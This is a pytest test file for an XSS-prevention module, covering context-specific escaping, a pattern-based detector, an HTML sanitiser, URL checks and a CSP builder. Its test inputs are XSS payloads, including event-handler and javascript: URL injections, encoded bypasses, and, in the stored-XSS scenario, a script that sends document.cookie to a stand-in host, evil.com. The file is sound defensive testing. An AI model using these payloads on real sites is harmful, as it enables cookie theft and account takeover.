"""
SEC-012: Tests for XSS Prevention.
"""

import pytest


class TestOutputContext:
    """Test OutputContext enum."""

    def test_contexts_defined(self):
        """Should define all output contexts."""
        from shared.xss_prevention import OutputContext

        assert OutputContext.HTML_BODY.value == "html_body"
        assert OutputContext.JS_STRING.value == "js_string"
        assert OutputContext.URL.value == "url"
        assert OutputContext.CSS_STRING.value == "css_string"
        assert OutputContext.JSON.value == "json"


class TestEscapeHtml:
    """Test HTML escaping functions."""

    def test_escape_special_chars(self):
        """Should escape HTML special characters."""
        from shared.xss_prevention import escape_html

        result = escape_html('<script>alert("XSS")</script>')

        assert '<' not in result
        assert '>' not in result
        assert '&lt;' in result
        assert '&gt;' in result

    def test_escape_quotes(self):
        """Should escape quotes."""
        from shared.xss_prevention import escape_html

        result = escape_html('test "double" and \'single\'')

        assert '"' not in result
        assert "'" not in result

    def test_escape_ampersand(self):
        """Should escape ampersand."""
        from shared.xss_prevention import escape_html

        result = escape_html('test & value')

        assert '&amp;' in result

    def test_handles_non_string(self):
        """Should handle non-string input."""
        from shared.xss_prevention import escape_html

        result = escape_html(123)

        assert result == "123"


class TestEscapeHtmlAttribute:
    """Test HTML attribute escaping."""

    def test_escape_for_attribute(self):
        """Should escape for attribute context."""
        from shared.xss_prevention import escape_html_attribute

        result = escape_html_attribute('value" onclick="alert(1)')

        assert '"' not in result
        assert 'onclick' not in result or '&#' in result

    def test_alphanumeric_unchanged(self):
        """Alphanumeric should be unchanged."""
        from shared.xss_prevention import escape_html_attribute

        result = escape_html_attribute('hello123')

        assert result == 'hello123'


class TestEscapeJs:
    """Test JavaScript escaping."""

    def test_escape_quotes(self):
        """Should escape JS quotes."""
        from shared.xss_prevention import escape_js

        result = escape_js("test'value\"more")

        assert "\\'" in result
        assert '\\"' in result

    def test_escape_script_tag(self):
        """Should prevent script tag injection."""
        from shared.xss_prevention import escape_js

        result = escape_js('</script><script>alert(1)')

        assert '</script>' not in result
        assert '\\x3C' in result

    def test_escape_newlines(self):
        """Should escape newlines."""
        from shared.xss_prevention import escape_js

        result = escape_js("line1\nline2\rline3")

        assert '\\n' in result
        assert '\\r' in result


class TestEscapeUrl:
    """Test URL escaping."""

    def test_escape_special_chars(self):
        """Should URL encode special characters."""
        from shared.xss_prevention import escape_url

        result = escape_url('test value&param=1')

        assert '%20' in result  # space
        assert '%26' in result  # &

    def test_escape_url_param(self):
        """Should escape URL parameters."""
        from shared.xss_prevention import escape_url_param

        result = escape_url_param('value with spaces')

        assert '+' in result or '%20' in result


class TestEscapeCss:
    """Test CSS escaping."""

    def test_escape_css_string(self):
        """Should escape for CSS string."""
        from shared.xss_prevention import escape_css

        result = escape_css('test;color:red')

        assert ';' not in result or '\\' in result

    def test_alphanumeric_unchanged(self):
        """Alphanumeric should be unchanged."""
        from shared.xss_prevention import escape_css

        result = escape_css('hello123')

        assert result == 'hello123'


class TestEscapeJson:
    """Test JSON escaping."""

    def test_escape_json(self):
        """Should escape for JSON in HTML."""
        from shared.xss_prevention import escape_json

        result = escape_json('<script>')

        assert '<' not in result
        assert '\\u003C' in result

    def test_handles_dict(self):
        """Should handle dict input."""
        from shared.xss_prevention import escape_json

        result = escape_json({"key": "value"})

        assert '"key"' in result
        assert '"value"' in result


class TestXSSPatterns:
    """Test XSS pattern definitions."""

    def test_script_patterns(self):
        """Should have script tag patterns."""
        from shared.xss_prevention import XSSPatterns

        assert len(XSSPatterns.SCRIPT_TAGS) > 0

    def test_event_patterns(self):
        """Should have event handler patterns."""
        from shared.xss_prevention import XSSPatterns

        assert len(XSSPatterns.EVENT_HANDLERS) > 0


class TestXSSDetector:
    """Test XSS detection."""

    def test_detect_script_tag(self):
        """Should detect script tags."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        result = detector.detect('<script>alert(1)</script>')

        assert result.is_suspicious
        assert 'script_tag' in result.detected_patterns
        assert result.risk_level == 'high'

    def test_detect_event_handler(self):
        """Should detect event handlers."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        result = detector.detect('<img src=x onerror="alert(1)">')

        assert result.is_suspicious
        assert 'event_handler' in result.detected_patterns

    def test_detect_javascript_url(self):
        """Should detect javascript: URLs."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        result = detector.detect('<a href="javascript:alert(1)">')

        assert result.is_suspicious
        assert 'javascript_url' in result.detected_patterns

    def test_detect_dangerous_tags(self):
        """Should detect dangerous tags."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        
        for tag in ['iframe', 'object', 'embed', 'svg']:
            result = detector.detect(f'<{tag} src="evil.com">')
            assert result.is_suspicious
            assert 'dangerous_tag' in result.detected_patterns

    def test_detect_expressions(self):
        """Should detect expression patterns."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        result = detector.detect('expression(alert(1))')

        assert result.is_suspicious
        assert 'expression_pattern' in result.detected_patterns

    def test_safe_input(self):
        """Should pass safe input."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        result = detector.detect('Hello, world!')

        assert not result.is_suspicious
        assert len(result.detected_patterns) == 0
        assert result.risk_level == 'low'

    def test_result_bool(self):
        """Detection result should work as bool."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        
        suspicious = detector.detect('<script>')
        safe = detector.detect('hello')

        assert bool(suspicious) is True
        assert bool(safe) is False


class TestHTMLSanitizer:
    """Test HTML sanitizer."""

    def test_remove_script_tags(self):
        """Should remove script tags and content."""
        from shared.xss_prevention import HTMLSanitizer

        sanitizer = HTMLSanitizer()
        result = sanitizer.sanitize('<p>Hello</p><script>evil()</script><p>World</p>')

        assert '<script>' not in result
        assert 'evil()' not in result
        assert 'Hello' in result
        assert 'World' in result

    def test_remove_style_tags(self):
        """Should remove style tags."""
        from shared.xss_prevention import HTMLSanitizer

        sanitizer = HTMLSanitizer()
        result = sanitizer.sanitize('<style>.evil{}</style><p>Content</p>')

        assert '<style>' not in result
        assert 'Content' in result

    def test_remove_event_handlers(self):
        """Should remove event handlers."""
        from shared.xss_prevention import HTMLSanitizer

        sanitizer = HTMLSanitizer()
        result = sanitizer.sanitize('<img src="test.png" onerror="alert(1)">')

        assert 'onerror' not in result

    def test_remove_javascript_urls(self):
        """Should remove javascript: URLs."""
        from shared.xss_prevention import HTMLSanitizer

        sanitizer = HTMLSanitizer()
        result = sanitizer.sanitize('<a href="javascript:alert(1)">Click</a>')

        assert 'javascript:' not in result

    def test_strip_all_tags(self):
        """Should strip all tags."""
        from shared.xss_prevention import HTMLSanitizer

        sanitizer = HTMLSanitizer()
        result = sanitizer.strip_all_tags('<p><b>Hello</b> <i>World</i></p>')

        assert '<' not in result
        assert 'Hello' in result
        assert 'World' in result


class TestXSSPrevention:
    """Test XSSPrevention main class."""

    def test_escape_html_body(self):
        """Should escape for HTML body."""
        from shared.xss_prevention import XSSPrevention, OutputContext

        xss = XSSPrevention()
        result = xss.escape_for_context('<script>', OutputContext.HTML_BODY)

        assert '<script>' not in result
        assert '&lt;' in result

    def test_escape_html_attribute(self):
        """Should escape for HTML attribute."""
        from shared.xss_prevention import XSSPrevention, OutputContext

        xss = XSSPrevention()
        result = xss.escape_for_context('test"onclick=', OutputContext.HTML_ATTRIBUTE)

        assert '"' not in result
        assert '&#' in result

    def test_escape_js_string(self):
        """Should escape for JS string."""
        from shared.xss_prevention import XSSPrevention, OutputContext

        xss = XSSPrevention()
        result = xss.escape_for_context("test'value", OutputContext.JS_STRING)

        assert "\\'" in result

    def test_escape_url(self):
        """Should escape for URL."""
        from shared.xss_prevention import XSSPrevention, OutputContext

        xss = XSSPrevention()
        result = xss.escape_for_context('test value', OutputContext.URL)

        assert ' ' not in result
        assert '%20' in result

    def test_escape_json(self):
        """Should escape for JSON."""
        from shared.xss_prevention import XSSPrevention, OutputContext

        xss = XSSPrevention()
        result = xss.escape_for_context('<tag>', OutputContext.JSON)

        assert '<' not in result

    def test_detect_xss(self):
        """Should detect XSS."""
        from shared.xss_prevention import XSSPrevention

        xss = XSSPrevention()
        result = xss.detect_xss('<script>alert(1)</script>')

        assert result.is_suspicious

    def test_sanitize_html(self):
        """Should sanitize HTML."""
        from shared.xss_prevention import XSSPrevention

        xss = XSSPrevention()
        result = xss.sanitize_html('<p>Hello</p><script>bad</script>')

        assert '<script>' not in result

    def test_is_safe_url_valid(self):
        """Should accept safe URLs."""
        from shared.xss_prevention import XSSPrevention

        xss = XSSPrevention()

        assert xss.is_safe_url('https://example.com') is True
        assert xss.is_safe_url('http://example.com') is True
        assert xss.is_safe_url('/path/to/page') is True

    def test_is_safe_url_dangerous(self):
        """Should reject dangerous URLs."""
        from shared.xss_prevention import XSSPrevention

        xss = XSSPrevention()

        assert xss.is_safe_url('javascript:alert(1)') is False
        assert xss.is_safe_url('vbscript:msgbox(1)') is False
        assert xss.is_safe_url('data:text/html,<script>') is False

    def test_sanitize_url(self):
        """Should sanitize URLs."""
        from shared.xss_prevention import XSSPrevention

        xss = XSSPrevention()

        assert xss.sanitize_url('https://example.com') == 'https://example.com'
        assert xss.sanitize_url('javascript:alert(1)') == ''


class TestTemplateHelpers:
    """Test template helper functions."""

    def test_safe_html(self):
        """Should escape HTML."""
        from shared.xss_prevention import TemplateHelpers

        result = TemplateHelpers.safe_html('<b>test</b>')

        assert '<' not in result

    def test_safe_attr(self):
        """Should escape for attribute."""
        from shared.xss_prevention import TemplateHelpers

        result = TemplateHelpers.safe_attr('test"value')

        assert '"' not in result

    def test_safe_js(self):
        """Should escape for JS."""
        from shared.xss_prevention import TemplateHelpers

        result = TemplateHelpers.safe_js("test'value")

        assert "\\'" in result

    def test_safe_url(self):
        """Should escape for URL."""
        from shared.xss_prevention import TemplateHelpers

        result = TemplateHelpers.safe_url('test value')

        assert '%20' in result


class TestCSPBuilder:
    """Test CSP builder."""

    def test_build_simple_policy(self):
        """Should build simple CSP."""
        from shared.xss_prevention import CSPBuilder

        builder = CSPBuilder()
        builder.default_src("'self'")

        result = builder.build()

        assert "default-src 'self'" in result

    def test_build_multiple_directives(self):
        """Should build multiple directives."""
        from shared.xss_prevention import CSPBuilder

        builder = CSPBuilder()
        builder.default_src("'self'")
        builder.script_src("'self'", "https://cdn.example.com")
        builder.style_src("'self'", "'unsafe-inline'")

        result = builder.build()

        assert "default-src 'self'" in result
        assert "script-src 'self' https://cdn.example.com" in result
        assert "style-src 'self' 'unsafe-inline'" in result

    def test_strict_policy(self):
        """Should create strict policy."""
        from shared.xss_prevention import CSPBuilder

        builder = CSPBuilder.strict_policy()
        result = builder.build()

        assert "default-src 'self'" in result
        assert "script-src 'self'" in result
        assert "object-src 'none'" in result
        assert "frame-ancestors 'none'" in result


class TestXSSAttackScenarios:
    """Test real-world XSS attack scenarios."""

    def test_stored_xss(self):
        """Should prevent stored XSS."""
        from shared.xss_prevention import XSSPrevention, OutputContext

        xss = XSSPrevention()
        malicious = '<script>document.location="http://evil.com?c="+document.cookie</script>'

        result = xss.escape_for_context(malicious, OutputContext.HTML_BODY)

        assert '<script>' not in result
        assert 'document.cookie' not in result or '&' in result

    def test_reflected_xss_in_url(self):
        """Should prevent reflected XSS in URL param."""
        from shared.xss_prevention import XSSPrevention, OutputContext

        xss = XSSPrevention()
        malicious = '"><script>alert(1)</script>'

        result = xss.escape_for_context(malicious, OutputContext.URL_PARAM)

        assert '<script>' not in result

    def test_dom_xss_in_attribute(self):
        """Should prevent DOM XSS in attribute."""
        from shared.xss_prevention import XSSPrevention, OutputContext

        xss = XSSPrevention()
        malicious = '" onmouseover="alert(1)'

        result = xss.escape_for_context(malicious, OutputContext.HTML_ATTRIBUTE)

        assert 'onmouseover' not in result or '&#' in result

    def test_xss_with_encoding_bypass(self):
        """Should detect encoded XSS attempts."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector(strict=True)
        
        # HTML entity encoding
        result = detector.detect('&#60;script&#62;')
        assert result.is_suspicious

        # Hex encoding
        result = detector.detect('\\x3Cscript\\x3E')
        assert result.is_suspicious

    def test_xss_in_json_response(self):
        """Should prevent XSS in JSON."""
        from shared.xss_prevention import escape_json

        malicious = '</script><script>alert(1)</script>'
        result = escape_json(malicious)

        assert '</script>' not in result

    def test_svg_xss(self):
        """Should detect SVG-based XSS."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        result = detector.detect('<svg onload="alert(1)">')

        assert result.is_suspicious

    def test_img_error_xss(self):
        """Should detect img onerror XSS."""
        from shared.xss_prevention import XSSDetector

        detector = XSSDetector()
        result = detector.detect('<img src=x onerror=alert(1)>')

        assert result.is_suspicious
